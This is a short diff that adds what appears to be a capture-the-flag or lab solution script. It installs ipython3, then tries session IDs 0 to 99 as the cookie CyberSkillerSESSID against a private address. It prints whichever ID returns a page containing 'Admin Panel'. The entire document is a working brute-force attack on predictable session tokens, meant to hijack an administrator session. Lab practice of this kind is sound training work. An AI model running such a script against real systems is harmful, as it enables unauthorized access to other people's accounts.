@@ -1,0 +1,11 @@
+sudo apt -y update
+sudo apt -y install ipython3
+
+ipython3 
+
+import requests
+
+for i in range(100):
+  r = requests.get('http://10.0.95.0/', cookies={'CyberSkillerSESSID': str(i)})
+  if 'Admin Panel' in r.text:
+    print(i)
